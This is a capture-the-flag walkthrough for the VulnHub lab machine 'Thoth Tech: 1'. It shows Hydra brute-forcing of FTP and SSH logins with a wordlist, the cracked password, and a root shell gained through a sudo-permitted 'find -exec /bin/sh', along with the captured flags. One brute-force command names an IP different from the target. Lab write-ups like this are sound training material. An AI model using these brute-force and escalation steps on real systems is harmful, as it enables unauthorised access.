# Thoth Tech: 1

link: https://www.vulnhub.com/entry/thoth-tech-1,734/

## Enum
IP: 192.168.1.169

Nmap 

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Ftp

Found a note.txt on the server

```
Dear pwnlab,

My name is jake. Your password is very weak and easily crackable, I think change your password.
```

Ftp Brute

```
hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ftp://10.150.150.11
```

SSH Brute

```
hydra -l pwnlab -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.169

[22][ssh] host: 192.168.1.169   login: pwnlab   password: babygirl1

```

SSH Login

```
ssh pwnlab@192.168.1.169
babygirl1
```

## User

```
cat user.txt
5ec2a44a73e7b259c6b0abc174291359
```

## Root 

```
sudo -l
Matching Defaults entries for pwnlab on thothtech:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwnlab may run the following commands on thothtech:
    (root) NOPASSWD: /usr/bin/find
```

exploit to root

```
sudo find . -exec /bin/sh \; -quit

pwnlab@thothtech:~$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
#
...
# cat root.txt
Root flag: d51546d5bcf8e3856c7bff5d201f0df6

good job :)

```

